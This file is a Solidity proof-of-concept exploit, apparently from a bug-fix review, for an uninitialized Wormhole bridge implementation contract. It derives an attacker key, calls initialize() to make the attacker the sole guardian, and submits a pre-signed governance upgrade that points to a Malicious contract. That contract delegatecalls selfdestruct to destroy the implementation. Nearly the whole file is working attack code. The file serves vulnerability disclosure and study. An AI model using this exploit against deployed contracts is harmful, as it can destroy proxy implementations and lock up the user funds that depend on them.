    // SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@immunefi/PoC.sol";

address constant wormholeImpl = 0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d;
string constant mnemonic = "test test test test test test test test test test test junk";

interface IImplementation {
    struct GuardianSet {
        address[] keys;
        uint32 expirationTime;
    }

    function isInitialized(address impl) external view returns (bool);
    function initialize(
        address[] memory initialGuardians,
        uint16 chainId,
        uint16 governanceChainId,
        bytes32 governanceContract
    ) external;
    function getCurrentGuardianSetIndex() external view returns (uint32);
    function getGuardianSet(uint32 index) external view returns (GuardianSet memory);
    function submitContractUpgrade(bytes memory _vm) external;
    function governanceChainId() external view returns (uint16);
    function governanceContract() external view returns (bytes32);
}

contract WormholeBugFixReview is PoC {
    address wormholeImplAddr;

    address internal attacker;

    function initializeAttack() public {
        console.log("\n>>> Initialize attack");
        //Checking the deployed contract you can find the Implementation slot where the address is stored "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
        bytes32 implementation =
            vm.load(wormholeImpl, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        //Convert bytes32 to address:
        wormholeImplAddr = address(uint160(uint256(implementation)));
        console.log("Is a contract?", isContract(wormholeImpl));

        uint256 attackerPrivateKey = vm.deriveKey(mnemonic, 0);
        attacker = vm.addr(attackerPrivateKey);
        console.log("Attacker address: ", attacker);

        _executeAttack();
    }

    function _executeAttack() internal {
        console.log("\n>>> Execute attack");
        // 1. Call initicalize() to become the owner of the contract
        address[] memory t = new address[] (1);
        t[0] = attacker;
        vm.prank(attacker);
        IImplementation(wormholeImpl).initialize(
            t, 0, 0, 0x0000000000000000000000000000000000000000000000000000000000000000
        );
        console.log("Is initialized? ", IImplementation(wormholeImpl).isInitialized(wormholeImplAddr));
        address[] memory guardSet = IImplementation(wormholeImpl).getGuardianSet(0).keys;
        console.log("Guardian: ", guardSet[0]);

        // 2. Deploy the Malicious contract with selfdestruct function. And prepare the load.
        Malicious malicious = new Malicious();

        // 3. Call upgradeToAndCall() on the implementation contract (as owner) pointing to the malicious contract
        bytes memory data = hex"00000000000000000000000000000000000000000000000000000000436f726501";

        bytes memory uint16Value = abi.encodePacked(uint16(0));
        bytes memory addressValue = abi.encodePacked(bytes32(uint256(uint160(address(malicious))))); //Encode with 32 bytes

        data = abi.encodePacked(data, uint16Value, addressValue);

        // VM signed and encoded using this function offchain: https://github.com/immunefi-team/wormhole-uninitialized/blob/a206258c92b98c96f93a23ddf1d56049e2abd4bc/poc.js#L31
        bytes memory vm_enc =
            hex"010000000001008a5706979cc0a876c6a041a2e7963619fe00ccfd7fdcb7d2a3a3f9d4e2f47c7f42c5095e247eb9f7974bbe887729dbee5f7064a831c3586378a4fca46747737f0100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000436f7265010000000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00";

        vm.prank(attacker);
        IImplementation(wormholeImpl).submitContractUpgrade(vm_enc);
        _completeAttack();
    }

    function _completeAttack() internal {
        console.log("\n>>> Complete attack");
    }

    function isContract(address _addr) public view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}

contract Malicious {
    function initialize() external {
        Destructor des = new Destructor();
        (bool success,) = address(des).delegatecall(abi.encodeWithSignature("destruct()"));
        require(success);
    }
}

contract Destructor {
    function destruct() external {
        selfdestruct(payable(msg.sender));
    }
}
